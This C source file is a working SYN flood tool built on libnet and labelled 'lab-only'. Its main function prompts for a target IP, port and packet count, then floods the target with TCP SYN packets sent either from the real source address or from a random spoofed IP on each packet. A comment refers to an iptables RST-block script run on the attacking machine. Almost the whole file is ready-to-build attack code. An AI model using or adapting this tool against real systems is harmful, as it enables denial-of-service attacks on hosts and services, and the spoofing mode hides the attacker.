// syn.c — Lab-only SYN flood demo using libnet.
// Build: gcc -O2 -o syn syn.c -lnet
// Run:   sudo ./syn
//        (then just answer the prompts)

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>
#include <unistd.h>
#include <libnet.h>

/* ==================================================================
 * Small helpers so the attack functions read like English.
 * ================================================================== */

static libnet_t *open_injector(void)
{
    char errbuf[LIBNET_ERRBUF_SIZE];
    libnet_t *ctx = libnet_init(LIBNET_RAW4, NULL, errbuf);
    if (!ctx) {
        fprintf(stderr, "libnet_init: %s\n", errbuf);
        exit(1);
    }
    return ctx;
}

static void parse_ip(const char *text, uint32_t *out)
{
    uint32_t v = libnet_name2addr4(NULL, (char *)text, LIBNET_DONT_RESOLVE);
    if (v == (uint32_t)-1) {
        fprintf(stderr, "bad IP: %s\n", text);
        exit(1);
    }
    *out = v;
}

/* Pick a plausible random source IP: skip 0.x, 127.x, 224+. */
static uint32_t random_source_ip(uint32_t target)
{
    for (;;) {
        uint32_t c = (uint32_t)libnet_get_prand(LIBNET_PR32);
        uint8_t first = (c >> 24) & 0xFF;
        if (first == 0 || first == 127 || first >= 224) continue;
        if (c == target) continue;
        return c;
    }
}

/* ==================================================================
 * syn_flood_regular() — SYN flood with the REAL source IP.
 *   * same src IP on every packet
 *   * random src port + seq so each packet is a distinct connection
 *   * requires the iptables RST block on the attacker:
 *       sudo ./attacker_rst_block.sh apply <target_ip>
 * ================================================================== */
static void syn_flood_regular(const char *src_ip_str,
                              const char *dst_ip_str,
                              int dst_port,
                              long count)
{
    uint32_t src_ip, dst_ip;
    parse_ip(src_ip_str, &src_ip);
    parse_ip(dst_ip_str, &dst_ip);

    printf("\n[regular] real src %s -> %s:%d  (%ld packets)\n",
           src_ip_str, dst_ip_str, dst_port, count);

    libnet_t *ctx = open_injector();

    for (long i = 0; i < count; i++) {
        uint16_t sport = (uint16_t)(1024 + libnet_get_prand(LIBNET_PR16) % 64000);
        uint32_t seq   = libnet_get_prand(LIBNET_PR32);

        libnet_build_tcp(sport, (uint16_t)dst_port,
                         seq, 0, TH_SYN, 5840, 0, 0,
                         LIBNET_TCP_H, NULL, 0, ctx, 0);

        libnet_build_ipv4(LIBNET_IPV4_H + LIBNET_TCP_H,
                          0, 0, 0, 64, IPPROTO_TCP, 0,
                          src_ip,          /* same every time */
                          dst_ip,
                          NULL, 0, ctx, 0);

        if (libnet_write(ctx) < 0)
            fprintf(stderr, "libnet_write: %s\n", libnet_geterror(ctx));

        libnet_clear_packet(ctx);

        if ((i + 1) % 1000 == 0)
            printf("  sent %ld\n", i + 1);
    }

    libnet_destroy(ctx);
}

/* ==================================================================
 * syn_flood_spoofed() — SYN flood with SPOOFED source IPs.
 *   * src IP is randomized every packet
 *   * SYN-ACKs go to fake hosts that never reply
 *   * NO iptables rule needed
 * ================================================================== */
static void syn_flood_spoofed(const char *dst_ip_str,
                              int dst_port,
                              long count)
{
    uint32_t dst_ip;
    parse_ip(dst_ip_str, &dst_ip);

    printf("\n[spoofed] spoofed -> %s:%d  (%ld packets)\n",
           dst_ip_str, dst_port, count);

    libnet_t *ctx = open_injector();

    for (long i = 0; i < count; i++) {
        uint32_t src_ip = random_source_ip(dst_ip);
        uint16_t sport  = (uint16_t)(1024 + libnet_get_prand(LIBNET_PR16) % 64000);
        uint32_t seq    = libnet_get_prand(LIBNET_PR32);

        libnet_build_tcp(sport, (uint16_t)dst_port,
                         seq, 0, TH_SYN, 5840, 0, 0,
                         LIBNET_TCP_H, NULL, 0, ctx, 0);

        libnet_build_ipv4(LIBNET_IPV4_H + LIBNET_TCP_H,
                          0, 0, 0, 64, IPPROTO_TCP, 0,
                          src_ip,          /* different every time */
                          dst_ip,
                          NULL, 0, ctx, 0);

        if (libnet_write(ctx) < 0)
            fprintf(stderr, "libnet_write: %s\n", libnet_geterror(ctx));

        libnet_clear_packet(ctx);

        if ((i + 1) % 1000 == 0)
            printf("  sent %ld  (last spoof: %u.%u.%u.%u)\n", i + 1,
                   (src_ip >>  0) & 0xFF,
                   (src_ip >>  8) & 0xFF,
                   (src_ip >> 16) & 0xFF,
                   (src_ip >> 24) & 0xFF);
    }

    libnet_destroy(ctx);
}

/* ==================================================================
 * main — just ask the user for everything with scanf.
 * ================================================================== */
int main(void)
{
    /* --- variables we're going to fill in from the user --- */
    int  mode;                 /* 1 = regular, 2 = spoofed */
    char src_ip[32];           /* only used when mode == 1 */
    char dst_ip[32];
    int  dst_port;
    long count;

    srand(time(NULL));
    setvbuf(stdout, NULL, _IOLBF, 0);

    printf("============================================\n");
    printf("   SYN flood demo  (lab-only, libnet)\n");
    printf("============================================\n\n");

    /* --- 1. ask which mode --- */
    printf("Choose a mode:\n");
    printf("  1 = regular  (SYNs from YOUR real IP)\n");
    printf("  2 = spoofed  (SYNs from RANDOM fake IPs)\n\n");
    printf("Type 1 or 2: ");
    scanf("%d", &mode);

    /* --- 2. ask for source IP only if regular --- */
    if (mode == 1) {
        printf("Enter source IP (this machine): ");
        scanf("%31s", src_ip);
    } else {
        /* spoofed: source IP is random, so we don't ask */
        strcpy(src_ip, "0.0.0.0");
    }

    /* --- 3. ask for target IP --- */
    printf("Enter destination IP: ");
    scanf("%31s", dst_ip);

    /* --- 4. ask for target port --- */
    printf("Enter destination port: ");
    scanf("%d", &dst_port);

    /* --- 5. ask how many packets --- */
    printf("Enter number of packets: ");
    scanf("%ld", &count);

    /* --- 6. show what we got --- */
    printf("\n--------------------------------------------\n");
    printf("  mode    : %s\n", mode == 1 ? "regular" : "spoofed");
    if (mode == 1)
        printf("  source  : %s\n", src_ip);
    else
        printf("  source  : (random fake IP each packet)\n");
    printf("  target  : %s:%d\n", dst_ip, dst_port);
    printf("  packets : %ld\n", count);
    printf("--------------------------------------------\n\n");

    /* --- 7. fire --- */
    if (mode == 1)
        syn_flood_regular(src_ip, dst_ip, dst_port, count);
    else
        syn_flood_spoofed(dst_ip, dst_port, count);

    printf("\n[+] done.\n");
    return 0;
}
